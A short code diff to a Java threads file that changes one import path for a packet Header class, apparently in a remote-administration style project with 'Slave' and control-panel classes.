@@ -1,7 +1,7 @@
 package com.redpois0n.threads;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.Header;
+import com.redpois0n.packets.out.Header;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlSystemMonitor;
 
